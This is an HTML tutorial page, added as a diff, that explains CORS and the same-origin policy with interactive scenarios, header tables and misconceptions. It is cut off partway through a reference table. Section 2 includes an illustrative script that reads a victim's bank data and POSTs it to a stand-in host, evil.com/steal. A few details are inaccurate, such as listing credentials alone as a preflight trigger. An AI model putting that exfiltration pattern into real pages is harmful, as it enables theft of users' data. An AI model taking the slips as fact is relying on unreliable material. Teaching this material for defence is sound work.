@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CORS · Deep Visual Guide</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f0f17;--surface:#1a1a2e;--surface2:#23234a;--text:#cdd6f4;--muted:#6c7086;
+  --blue:#89b4fa;--green:#a6e3a1;--red:#f38ba8;--yellow:#f9e2af;--peach:#fab387;
+  --teal:#94e2d5;--pink:#f5c2e7;--lavender:#b4befe;--radius:8px;--orange:#f8bd7f;--header-bg:#1e1e36;
+}
+body{font-family:system-ui,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding-bottom:60px}
+nav{background:var(--header-bg);padding:14px 24px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--surface2);position:sticky;top:0;z-index:100}
+nav .logo{font-weight:700;font-size:1.1rem}
+nav .logo span{color:var(--peach)}
+nav .crumbs{font-size:.78rem;color:var(--muted)}
+nav .crumbs a{color:var(--blue);text-decoration:none}
+nav .tag{font-size:.7rem;padding:2px 8px;border-radius:12px;background:rgba(250,179,135,.18);color:var(--peach);margin-left:auto}
+.container{max-width:1000px;margin:0 auto;padding:24px 20px}
+.section-title{font-size:1.4rem;font-weight:700;margin:36px 0 14px;color:var(--yellow);display:flex;align-items:center;gap:10px}
+.section-title .num{background:var(--surface2);color:var(--muted);font-size:.75rem;padding:2px 10px;border-radius:20px}
+.card{background:var(--surface);border:1px solid var(--surface2);border-radius:var(--radius);padding:20px;margin-bottom:18px}
+.card h3{color:var(--blue);margin-bottom:8px;font-size:1rem}
+.card p{color:var(--muted);font-size:.88rem;margin-bottom:8px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+@media(max-width:680px){.grid2,.grid3{grid-template-columns:1fr}}
+.code{background:#0a0a14;border-radius:6px;padding:12px 14px;font-family:monospace;font-size:.76rem;overflow-x:auto;border:1px solid var(--surface2);line-height:1.7;margin:8px 0}
+.code .comment{color:var(--muted)}
+.code .keyword{color:var(--blue)}
+.code .string{color:var(--green)}
+.code .danger{color:var(--red);font-weight:700}
+.code .header{color:var(--yellow)}
+.callout{padding:12px 16px;border-radius:var(--radius);margin:12px 0;font-size:.84rem;border-left:4px solid var(--blue);background:rgba(137,180,250,.04)}
+.callout.danger{border-color:var(--red);background:rgba(243,139,168,.06)}
+.callout.warn{border-color:var(--yellow);background:rgba(249,226,175,.06)}
+.callout.success{border-color:var(--green);background:rgba(166,227,161,.06)}
+.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.7rem;font-weight:600}
+.badge.red{background:rgba(243,139,168,.18);color:var(--red)}
+.badge.blue{background:rgba(137,180,250,.18);color:var(--blue)}
+.badge.green{background:rgba(166,227,161,.18);color:var(--green)}
+.badge.yellow{background:rgba(249,226,175,.18);color:var(--yellow)}
+.btn{padding:8px 18px;border-radius:6px;border:none;font-weight:600;cursor:pointer;font-size:.82rem;transition:.15s}
+.btn.primary{background:var(--peach);color:#0f0f17}
+.btn.primary:hover{opacity:.85}
+.btn.outline{background:transparent;border:1px solid var(--surface2);color:var(--text)}
+.btn.outline:hover{background:var(--surface2)}
+.btn.danger{background:var(--red);color:white}
+.btn.green{background:var(--green);color:#0f0f17}
+.flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:center;padding:10px 0}
+.flow-node{background:var(--surface2);padding:8px 14px;border-radius:var(--radius);font-size:.8rem;text-align:center;min-width:80px}
+.flow-node.origin{background:var(--blue);color:white}
+.flow-node.target{background:var(--green);color:#0f0f17}
+.flow-node.block{background:var(--red);color:white}
+.flow-node.proxy{background:var(--yellow);color:#0f0f17}
+.flow-arrow{color:var(--muted);font-size:1rem}
+
+/* Request/response visual */
+.http-message{font-family:monospace;font-size:.76rem;background:#0a0a14;border-radius:6px;border:1px solid var(--surface2);overflow:hidden;margin:8px 0}
+.http-message .line{padding:4px 12px;border-bottom:1px solid rgba(255,255,255,.03)}
+.http-message .line:last-child{border-bottom:none}
+.http-message .method{color:var(--yellow);font-weight:700}
+.http-message .url{color:var(--text)}
+.http-message .header-name{color:var(--pink)}
+.http-message .header-val{color:var(--muted)}
+.http-message .body-json{padding:8px 12px;background:rgba(255,255,255,.02);color:var(--green)}
+
+/* Origin comparison */
+.origin-compare{display:flex;gap:16px;margin:12px 0;flex-wrap:wrap}
+.origin-card{padding:14px;border-radius:var(--radius);flex:1;min-width:160px;text-align:center;background:var(--bg);border:1px solid var(--surface2)}
+.origin-card h4{font-size:.82rem;margin-bottom:4px}
+.origin-card .url{font-family:monospace;font-size:.74rem;color:var(--muted);word-break:break-all}
+.origin-card .same{color:var(--green)}
+.origin-card .diff{color:var(--red)}
+
+/* Interactive scenario */
+.scenario-tabs{display:flex;gap:0;border-bottom:2px solid var(--surface2);margin-bottom:14px;flex-wrap:wrap}
+.scenario-tab{padding:8px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;font-size:.82rem;border-bottom:2px solid transparent;margin-bottom:-2px;transition:.15s}
+.scenario-tab.active{color:var(--peach);border-bottom-color:var(--peach);font-weight:600}
+.scenario-content{display:none}
+.scenario-content.active{display:block}
+
+/* Result boxes */
+.result-box{padding:14px;border-radius:6px;margin:10px 0;display:flex;align-items:flex-start;gap:12px}
+.result-box.success{background:rgba(166,227,161,.06);border:1px solid rgba(166,227,161,.2)}
+.result-box.fail{background:rgba(243,139,168,.06);border:1px solid rgba(243,139,168,.2)}
+.result-box .icon{font-size:1.2rem;flex-shrink:0;margin-top:2px}
+.result-box .detail{font-size:.82rem}
+.result-box .detail .code-inline{font-family:monospace;font-size:.76rem;background:rgba(255,255,255,.05);padding:1px 6px;border-radius:3px}
+
+/* Preflight animation */
+.preflight-stage{position:relative;background:var(--bg);border-radius:var(--radius);border:1px solid var(--surface2);padding:24px;margin:14px 0;min-height:200px}
+.preflight-stage .entity{position:absolute;padding:12px 18px;border-radius:var(--radius);text-align:center;font-size:.82rem;font-weight:600;transition:.3s}
+.preflight-stage .entity.browser{top:30px;left:20px;border:2px solid var(--blue);background:rgba(137,180,250,.08)}
+.preflight-stage .entity.server{top:30px;right:20px;border:2px solid var(--green);background:rgba(166,227,161,.08)}
+.preflight-stage .arrow-line{position:absolute;font-size:.72rem;color:var(--muted);text-align:center;transition:.3s}
+@media(max-width:600px){
+  .preflight-stage{min-height:300px}
+  .preflight-stage .entity{position:static;display:block;margin:8px auto;width:auto}
+  .preflight-stage .arrow-line{position:static;display:block;text-align:center;padding:4px 0}
+}
+
+/* Header table */
+table{width:100%;border-collapse:collapse;font-size:.82rem}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--surface2)}
+th{color:var(--muted);font-weight:600;font-size:.74rem;text-transform:uppercase}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+/* What if slider */
+.whatif-box{background:var(--bg);border-radius:var(--radius);border:1px dashed var(--surface2);padding:16px;margin:12px 0;min-height:100px}
+.whatif-box .world{font-size:1rem;margin-bottom:8px}
+.whatif-box .world .bad{color:var(--red);font-weight:700}
+.whatif-box .world .good{color:var(--green);font-weight:700}
+
+.toggle-group{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}
+.toggle-btn{padding:6px 14px;border-radius:20px;border:1px solid var(--surface2);background:transparent;color:var(--muted);cursor:pointer;font-size:.76rem;transition:.15s}
+.toggle-btn.active{background:var(--peach);color:#0f0f17;border-color:var(--peach)}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo"><span>CORS</span> · Deep Visual Guide</div>
+  <div class="crumbs"><a href="../security/index.html">SECURITY</a> &rsaquo; CORS</div>
+  <div class="tag">Cross-Origin Resource Sharing</div>
+</nav>
+
+<div class="container">
+
+<!-- ============ 1. THE PROBLEM ============ -->
+<div class="section-title"><span class="num">1</span> The Problem · Same-Origin Policy</div>
+
+<div class="card">
+  <p><strong>CORS</strong> exists because of the <strong>Same-Origin Policy (SOP)</strong> — a browser security mechanism that blocks a web page from making requests to a different origin than the one that served the page. CORS is the <strong>escape hatch</strong> that lets servers opt in to cross-origin requests.</p>
+  <div class="grid2">
+    <div style="border:1px solid var(--surface2);border-radius:var(--radius);padding:16px;background:var(--bg)">
+      <h4 style="font-size:.9rem;color:var(--text);margin-bottom:8px">What is an "origin"?</h4>
+      <div class="code" style="font-size:.74rem;background:#0a0a14;margin:0">
+<span class="comment">// Origin = scheme + host + port</span>
+<span style="color:var(--green)">https://api.example.com:443</span>
+&#9500;&#9472; scheme: <span style="color:var(--blue)">https</span>
+&#9500;&#9472; host:   <span style="color:var(--yellow)">api.example.com</span>
+&#9492;&#9472; port:   <span style="color:var(--pink)">443</span>
+      </div>
+      <div style="margin-top:8px;font-size:.78rem">
+        If <strong>any</strong> of these differ &rarr; <strong style="color:var(--red)">cross-origin</strong>
+      </div>
+    </div>
+    <div style="border:1px solid var(--surface2);border-radius:var(--radius);padding:16px;background:var(--bg)">
+      <h4 style="font-size:.9rem;color:var(--text);margin-bottom:8px">Same-origin vs Cross-origin</h4>
+      <table style="font-size:.74rem">
+        <tr><th>URL A</th><th>URL B</th><th>Result</th></tr>
+        <tr><td>https://a.com</td><td>https://a.com/api</td><td><span class="badge green">Same</span></td></tr>
+        <tr><td>https://a.com</td><td>https://<strong>b</strong>.com</td><td><span class="badge red">Cross</span></td></tr>
+        <tr><td>https://a.com</td><td>http://a.com</td><td><span class="badge red">Cross</span> (scheme)</td></tr>
+        <tr><td>https://a.com</td><td>https://a.com:<strong>8080</strong></td><td><span class="badge red">Cross</span> (port)</td></tr>
+        <tr><td>https://a.com</td><td>https://<strong>api</strong>.a.com</td><td><span class="badge red">Cross</span> (subdomain)</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 2. WHAT IF NO SOP ============ -->
+<div class="section-title"><span class="num">2</span> What If There Were No Same-Origin Policy?</div>
+
+<div class="card">
+  <h3>&#128520; The World Without SOP</h3>
+  <p>Click to see what would happen if the browser allowed any website to read responses from any other website.</p>
+
+  <div class="grid2">
+    <div>
+      <button class="btn danger" onclick="showWorldWithoutSOP()" style="width:100%">&#128308; Show World Without SOP</button>
+      <div class="whatif-box" id="whatifNoSOP" style="margin-top:10px">
+        <div class="world" style="color:var(--muted)">// Click the button above</div>
+      </div>
+    </div>
+    <div>
+      <button class="btn green" onclick="showWorldWithSOP()" style="width:100%">&#128994; Show World With SOP</button>
+      <div class="whatif-box" id="whatifWithSOP" style="margin-top:10px">
+        <div class="world" style="color:var(--muted)">// Click the button above</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="card" id="theAttackCard" style="display:none;border:2px solid var(--red)">
+  <h3 style="color:var(--red)">&#128520; The Attack That Would Be Possible</h3>
+  <div class="grid2">
+    <div>
+      <p><strong>Step 1:</strong> You visit <code>evil.com</code> in your browser while logged into <code>bank.com</code></p>
+      <div class="code" style="font-size:.74rem">
+<span class="comment">// Malicious page on evil.com:</span>
+fetch(<span class="string">'https://bank.com/api/transactions'</span>)
+  .then(<span class="keyword">function</span>(res) {
+    <span class="comment">// WITHOUT SOP, this works!</span>
+    <span class="danger">return res.json();</span>
+  })
+  .then(<span class="keyword">function</span>(data) {
+    <span class="comment">// Send stolen data to attacker</span>
+    fetch(<span class="string">'https://evil.com/steal'</span>, {
+      method: <span class="string">'POST'</span>,
+      body: JSON.stringify(data)
+    });
+  });
+      </div>
+    </div>
+    <div>
+      <p><strong>Step 2:</strong> Evil.com reads your bank transactions</p>
+      <div class="callout danger" style="font-size:.78rem">
+        <strong>Why this works without SOP:</strong> The browser auto-attaches cookies for bank.com. The server sees a valid session and returns your data. Evil.com reads the response.
+      </div>
+      <div class="callout success" style="font-size:.78rem">
+        <strong>Why SOP/CORS blocks this:</strong> The browser sees the response is cross-origin (evil.com &#8594; bank.com) and <strong>prevents evil.com's JavaScript from reading the response.</strong> The request goes through, but JS cannot access the data.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 3. WHAT CORS DOES ============ -->
+<div class="section-title"><span class="num">3</span> What CORS Actually Does</div>
+
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3>&#10003; CORS allows</h3>
+    <p>A server to explicitly say: <em>"I trust this other origin &#8212; let them read my response."</em></p>
+    <div class="flow" style="font-size:.78rem">
+      <div class="flow-node origin">myapp.com</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node" style="background:var(--green);color:#0f0f17">api.example.com</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node" style="background:var(--green);color:#0f0f17">&#10003; Response shared</div>
+    </div>
+    <div class="callout" style="font-size:.78rem;padding:8px 12px;margin:6px 0">
+      <strong>&#9432; CORS is server-driven.</strong> The server decides which origins are allowed by sending specific HTTP headers. The browser enforces this decision.
+    </div>
+  </div>
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3>&#10007; CORS does NOT</h3>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2.2">
+      <li>Block the request from being sent</li>
+      <li>Encrypt the request/response</li>
+      <li>Authenticate the user</li>
+      <li>Replace server-side auth</li>
+      <li>Protect against server-to-server attacks</li>
+    </ul>
+    <div class="callout warn" style="font-size:.78rem;padding:8px 12px;margin:6px 0">
+      <strong>&#9888; The request still reaches the server!</strong> SOP only prevents JS from <em>reading</em> the response. Side effects (POST, DELETE) still happen.
+    </div>
+  </div>
+</div>
+
+<!-- ============ 4. INTERACTIVE SCENARIOS ============ -->
+<div class="section-title"><span class="num">4</span> Interactive: CORS in Action</div>
+
+<div class="card">
+  <p>Choose a scenario and click "Send Request" to see whether CORS blocks or allows it, and why.</p>
+
+  <div class="scenario-tabs">
+    <button class="scenario-tab active" onclick="selectCorsScenario('simple',this)">Simple GET</button>
+    <button class="scenario-tab" onclick="selectCorsScenario('custom-header',this)">Custom Header</button>
+    <button class="scenario-tab" onclick="selectCorsScenario('credentials',this)">With Credentials</button>
+    <button class="scenario-tab" onclick="selectCorsScenario('put',this)">PUT Request</button>
+    <button class="scenario-tab" onclick="selectCorsScenario('no-cors',this)">No CORS headers</button>
+  </div>
+
+  <div class="scenario-content active" id="scenario-simple">
+    <div class="grid2">
+      <div>
+        <div class="http-message">
+          <div class="line"><span class="method">GET</span> <span class="url">https://api.example.com/users</span></div>
+          <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+        </div>
+        <div style="font-size:.78rem;color:var(--muted)">A simple GET request with no special headers. This is a <strong>"simple request"</strong> — no preflight needed.</div>
+      </div>
+      <div>
+        <button class="btn primary" onclick="runCorsScenario('simple')">&#9654; Send Request</button>
+        <div id="result-simple" class="result-box" style="margin-top:8px;min-height:60px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+          // Click "Send Request"
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="scenario-content" id="scenario-custom-header">
+    <div class="grid2">
+      <div>
+        <div class="http-message">
+          <div class="line"><span class="method">GET</span> <span class="url">https://api.example.com/users</span></div>
+          <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+          <div class="line"><span class="header-name">X-API-Key:</span> <span class="header-val">abc123</span></div>
+        </div>
+        <div style="font-size:.78rem;color:var(--muted)">Has a <strong>non-standard header</strong> (<code>X-API-Key</code>). Triggers a <strong>preflight</strong> (OPTIONS) before the real request.</div>
+      </div>
+      <div>
+        <button class="btn primary" onclick="runCorsScenario('custom-header')">&#9654; Send Request</button>
+        <div id="result-custom-header" class="result-box" style="margin-top:8px;min-height:60px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+          // Click "Send Request"
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="scenario-content" id="scenario-credentials">
+    <div class="grid2">
+      <div>
+        <div class="http-message">
+          <div class="line"><span class="method">GET</span> <span class="url">https://api.example.com/me</span></div>
+          <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+          <div class="line" style="color:var(--yellow)">credentials: 'include'</div>
+        </div>
+        <div style="font-size:.78rem;color:var(--muted)">Sends cookies with the request. Server must respond with <code>Access-Control-Allow-Credentials: true</code> AND <code>Access-Control-Allow-Origin</code> cannot be <code>*</code>.</div>
+      </div>
+      <div>
+        <button class="btn primary" onclick="runCorsScenario('credentials')">&#9654; Send Request</button>
+        <div id="result-credentials" class="result-box" style="margin-top:8px;min-height:60px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+          // Click "Send Request"
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="scenario-content" id="scenario-put">
+    <div class="grid2">
+      <div>
+        <div class="http-message">
+          <div class="line"><span class="method">PUT</span> <span class="url">https://api.example.com/users/42</span></div>
+          <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+          <div class="line"><span class="header-name">Content-Type:</span> <span class="header-val">application/json</span></div>
+        </div>
+        <div style="font-size:.78rem;color:var(--muted)">PUT with JSON body is not a "simple request" — triggers preflight.</div>
+      </div>
+      <div>
+        <button class="btn primary" onclick="runCorsScenario('put')">&#9654; Send Request</button>
+        <div id="result-put" class="result-box" style="margin-top:8px;min-height:60px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+          // Click "Send Request"
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="scenario-content" id="scenario-no-cors">
+    <div class="grid2">
+      <div>
+        <div class="http-message">
+          <div class="line"><span class="method">GET</span> <span class="url">https://api.example.com/data</span></div>
+          <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+          <div class="line" style="color:var(--muted)">(Server sends <strong>no</strong> CORS headers in response)</div>
+        </div>
+        <div style="font-size:.78rem;color:var(--muted)">The server is not configured for CORS. The browser receives the response but <strong>blocks JS from reading it</strong>.</div>
+      </div>
+      <div>
+        <button class="btn primary" onclick="runCorsScenario('no-cors')">&#9654; Send Request</button>
+        <div id="result-no-cors" class="result-box" style="margin-top:8px;min-height:60px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+          // Click "Send Request"
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 5. PREFLIGHT ============ -->
+<div class="section-title"><span class="num">5</span> Preflight Requests · The OPTIONS Dance</div>
+
+<div class="card">
+  <p>For "non-simple" requests, the browser sends a <strong>preflight</strong> <code>OPTIONS</code> request first, asking permission. Only if the server responds with the right headers does the browser send the actual request.</p>
+
+  <div class="preflight-stage" id="preflightAnim">
+    <div class="entity browser" id="pfBrowser">&#128187; Browser<br><span style="font-weight:400;font-size:.7rem;color:var(--muted)">myapp.com</span></div>
+    <div class="entity server" id="pfServer">&#127974; Server<br><span style="font-weight:400;font-size:.7rem;color:var(--muted)">api.example.com</span></div>
+  </div>
+
+  <div class="toggle-group">
+    <button class="btn primary" onclick="animatePreflight()">&#9654; Show Preflight Flow</button>
+    <button class="btn outline" onclick="resetPreflight()">Reset</button>
+  </div>
+  <div id="preflightLog" style="font-family:monospace;font-size:.74rem;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);min-height:60px;margin-top:8px;line-height:1.6">
+    // Click "Show Preflight Flow"
+  </div>
+</div>
+
+<div class="grid2">
+  <div class="card">
+    <h3>&#128279; Preflight request</h3>
+    <div class="http-message">
+      <div class="line"><span class="method">OPTIONS</span> <span class="url">/users</span></div>
+      <div class="line"><span class="header-name">Origin:</span> <span class="header-val">https://myapp.com</span></div>
+      <div class="line"><span class="header-name">Access-Control-Request-Method:</span> <span class="header-val">PUT</span></div>
+      <div class="line"><span class="header-name">Access-Control-Request-Headers:</span> <span class="header-val">X-API-Key</span></div>
+    </div>
+  </div>
+  <div class="card">
+    <h3>&#10003; Preflight response</h3>
+    <div class="http-message">
+      <div class="line"><span class="method">204</span> <span class="url">No Content</span></div>
+      <div class="line"><span class="header-name">Access-Control-Allow-Origin:</span> <span class="header-val" style="color:var(--green)">https://myapp.com</span></div>
+      <div class="line"><span class="header-name">Access-Control-Allow-Methods:</span> <span class="header-val" style="color:var(--green)">PUT, POST, GET</span></div>
+      <div class="line"><span class="header-name">Access-Control-Allow-Headers:</span> <span class="header-val" style="color:var(--green)">X-API-Key</span></div>
+      <div class="line"><span class="header-name">Access-Control-Max-Age:</span> <span class="header-val">86400</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 6. CORS HEADERS ============ -->
+<div class="section-title"><span class="num">6</span> CORS Headers Reference</div>
+
+<div class="card">
+  <table>
+    <tr><th>Header</th><th>Direction</th><th>What it does</th><th>Example</th></tr>
+    <tr>
+      <td><strong style="color:var(--green)">Access-Control-Allow-Origin</strong></td>
+      <td>&#8592; Response</td>
+      <td>Which origins can read the response. <code>*</code> allows all.</td>
+      <td><code>https://myapp.com</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--yellow)">Access-Control-Allow-Methods</strong></td>
+      <td>&#8592; Response (preflight)</td>
+      <td>Which HTTP methods are allowed cross-origin.</td>
+      <td><code>GET, POST, PUT</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--yellow)">Access-Control-Allow-Headers</strong></td>
+      <td>&#8592; Response (preflight)</td>
+      <td>Which custom headers are allowed.</td>
+      <td><code>X-API-Key, Authorization</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--blue)">Access-Control-Allow-Credentials</strong></td>
+      <td>&#8592; Response</td>
+      <td>Whether cookies can be sent cross-origin. If <code>true</code>, Allow-Origin cannot be <code>*</code>.</td>
+      <td><code>true</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--pink)">Access-Control-Expose-Headers</strong></td>
+      <td>&#8592; Response</td>
+      <td>Which response headers JS can read (beyond the default 6 simple headers).</td>
+      <td><code>X-Total-Count</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--orange)">Access-Control-Max-Age</strong></td>
+      <td>&#8592; Response (preflight)</td>
+      <td>How long (seconds) to cache the preflight result.</td>
+      <td><code>86400</code></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--peach)">Origin</strong></td>
+      <td>&#8594; Request</td>
+      <td>Sent by the browser — tells server where the request came from.</td>
+      <td><code>https://myapp.com</code></td>
+    </tr>
+  </table>
+</div>
+
+<!-- ============ 7. SIMPLE vs PREFLIGHT ============ -->
+<div class="section-title"><span class="num">7</span> Simple vs Preflight Requests</div>
+
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3>&#10003; Simple Request (no preflight)</h3>
+    <p style="font-size:.8rem">Must meet ALL of these:</p>
+    <ul style="padding-left:18px;font-size:.82rem;line-height:2;margin-top:6px">
+      <li><strong>Method:</strong> GET, HEAD, or POST</li>
+      <li><strong>Content-Type:</strong> application/x-www-form-urlencoded, multipart/form-data, or text/plain</li>
+      <li><strong>No custom headers</strong> (only browser-set ones like Accept, Accept-Language)</li>
+      <li><strong>No event listeners</strong> on the upload</li>
+      <li><strong>Readable response</strong> body is not <code>ReadableStream</code></li>
+    </ul>
+    <div class="callout success" style="font-size:.75rem;padding:8px;margin:6px 0">
+      Browser sends the request directly. If response has <code>Access-Control-Allow-Origin</code> matching the origin, JS can read it.
+    </div>
+  </div>
+  <div class="card" style="border-top:3px solid var(--blue)">
+    <h3>&#9888; Preflight Request</h3>
+    <p style="font-size:.8rem">Triggers an OPTIONS preflight if:</p>
+    <ul style="padding-left:18px;font-size:.82rem;line-height:2;margin-top:6px">
+      <li><strong>Method:</strong> PUT, DELETE, PATCH, etc.</li>
+      <li><strong>Content-Type:</strong> application/json, text/xml, etc.</li>
+      <li><strong>Custom headers:</strong> Authorization, X-*, etc.</li>
+      <li><strong>Credentials:</strong> with <code>credentials: 'include'</code></li>
+    </ul>
+    <div class="callout warn" style="font-size:.75rem;padding:8px;margin:6px 0">
+      Browser sends OPTIONS first. Server must respond with matching Allow-Origin, Allow-Methods, Allow-Headers. Only then does the browser send the real request.
+    </div>
+  </div>
+</div>
+
+<!-- ============ 8. COMMON SCENARIOS ============ -->
+<div class="section-title"><span class="num">8</span> Common CORS Scenarios</div>
+
+<div class="card">
+  <div class="grid2">
+    <div>
+      <h3>&#9654; Frontend calls API on different domain</h3>
+      <div class="code" style="font-size:.72rem">
+<span class="comment">// React app on https://myapp.com</span>
+<span class="comment">// calls https://api.example.com</span>
+fetch(<span class="string">'https://api.example.com/users'</span>)
+  .then(r => r.json())
+  .then(data => console.log(data));
+  <span class="comment">// &#10060; CORS error without proper headers!</span>
+      </div>
+      <p style="font-size:.78rem;color:var(--muted)"><strong>Fix:</strong> Server adds <code>Access-Control-Allow-Origin: https://myapp.com</code></p>
+    </div>
+    <div>
+      <h3>&#9654; Using credentials (cookies)</h3>
+      <div class="code" style="font-size:.72rem">
+<span class="comment">// Sending cookies cross-origin:</span>
+fetch(<span class="string">'https://api.example.com/me'</span>, {
+  <span style="color:var(--yellow)">credentials: 'include'</span>
+}).then(r => r.json());
+      </div>
+      <p style="font-size:.78rem;color:var(--muted)"><strong>Fix:</strong> Server must send both:<br>
+      <code>Access-Control-Allow-Credentials: true</code><br>
+      <code>Access-Control-Allow-Origin: https://myapp.com</code><br>
+      <span style="color:var(--red)">Cannot use <code>*</code> for Allow-Origin!</span></p>
+    </div>
+    <div>
+      <h3>&#9654; Custom headers (Authorization)</h3>
+      <div class="code" style="font-size:.72rem">
+fetch(<span class="string">'https://api.example.com/protected'</span>, {
+  headers: {
+    <span class="string">'Authorization'</span>: <span class="string">'Bearer eyJ...'</span>
+  }
+});
+      </div>
+      <p style="font-size:.78rem;color:var(--muted)"><strong>Fix:</strong> Preflight required. Server must include <code>Authorization</code> in <code>Access-Control-Allow-Headers</code>.</p>
+    </div>
+    <div>
+      <h3>&#9654; Public API (allow all origins)</h3>
+      <div class="code" style="font-size:.72rem">
+<span class="comment">// Server response for public API:</span>
+<span class="header-name">Access-Control-Allow-Origin:</span> *
+<span class="header-name">Access-Control-Allow-Methods:</span> GET
+      </div>
+      <p style="font-size:.78rem;color:var(--muted)">Use <code>*</code> only for public data. Cannot use with credentials.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 9. ERROR DEBUGGING ============ -->
+<div class="section-title"><span class="num">9</span> CORS Errors · Visualized</div>
+
+<div class="card">
+  <p>Here's what the browser actually tells you when CORS blocks a request.</p>
+  <div class="grid2">
+    <div class="result-box fail" style="margin:0">
+      <div class="icon">&#9888;</div>
+      <div class="detail">
+        <strong style="color:var(--red)">CORS error (no header):</strong>
+        <div class="code-inline" style="margin-top:4px;display:block;font-size:.72rem;line-height:1.5">
+Access to fetch at 'https://api.example.com/data'<br>
+from origin 'https://myapp.com' has been blocked<br>
+by CORS policy: <strong style="color:var(--red)">No 'Access-Control-Allow-Origin'</strong><br>
+header is present on the requested resource.
+        </div>
+        <div style="margin-top:6px;font-size:.75rem;color:var(--muted)">
+          &#8594; The request went through (server processed it)<br>
+          &#8594; The response came back with data<br>
+          &#8594; Browser saw no CORS header<br>
+          &#8594; Browser <strong>threw away the response</strong> from JS perspective
+        </div>
+      </div>
+    </div>
+    <div class="result-box fail" style="margin:0">
+      <div class="icon">&#9888;</div>
+      <div class="detail">
+        <strong style="color:var(--red)">CORS error (origin mismatch):</strong>
+        <div class="code-inline" style="margin-top:4px;display:block;font-size:.72rem;line-height:1.5">
+Access to fetch at 'https://api.example.com/data'<br>
+from origin 'https://myapp.com' has been blocked<br>
+by CORS policy: <strong style="color:var(--red)">The 'Access-Control-Allow-Origin'</strong><br>
+header has a value 'https://otherapp.com'<br>
+which is not equal to the supplied origin.
+        </div>
+        <div style="margin-top:6px;font-size:.75rem;color:var(--muted)">
+          &#8594; Server sent CORS header<br>
+          &#8594; But for a <em>different</em> origin than your app<br>
+          &#8594; Browser rejects it
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ 10. COMMON MISCONCEPTIONS ============ -->
+<div class="section-title"><span class="num">10</span> Common Misconceptions</div>
+
+<div class="card">
+  <div class="grid2" style="font-size:.84rem">
+    <div class="callout danger" style="margin:0;font-size:.82rem">
+      <strong>"CORS protects my API"</strong><br>
+      <span style="color:var(--text)">&#10060; <strong>False.</strong> CORS is browser-only. curl, Postman, mobile apps, server-to-server requests are never blocked by CORS. Your API still needs proper authentication.</span>
+    </div>
+    <div class="callout danger" style="margin:0;font-size:.82rem">
+      <strong>"I can fix CORS by adding a proxy"</strong><br>
+      <span style="color:var(--text)">&#10003; <strong>True but...</strong> A proxy (e.g., CORS proxy or your own backend) works by making the request server-to-server (not subject to CORS), then your frontend calls the proxy which is same-origin. This is a valid workaround but adds latency.</span>
+    </div>
+    <div class="callout danger" style="margin:0;font-size:.82rem">
+      <strong>"mode: 'no-cors' bypasses CORS"</strong><br>
+      <span style="color:var(--text)">&#10060; <strong>Partial truth.</strong> <code>no-cors</code> means the request is sent but <strong>you cannot read the response</strong> (response type is <code>opaque</code>). Useful for analytics pings, useless for data fetching.</span>
+    </div>
+    <div class="callout danger" style="margin:0;font-size:.82rem">
+      <strong>"Access-Control-Allow-Origin: * is fine for everything"</strong><br>
+      <span style="color:var(--text)">&#10060; <strong>Only for public data.</strong> If you send cookies (<code>credentials: 'include'</code>), <code>*</code> is not allowed — you must specify an exact origin.</span>
+    </div>
+  </div>
+</div>
+
+<!-- REFERENCE -->
+<div class="section-title"><span class="num">R</span> Quick Reference</div>
+<div class="card">
+  <table>
+    <tr><th>Concept</th><th>Summary</th><th>Key Takeaway</th></tr>
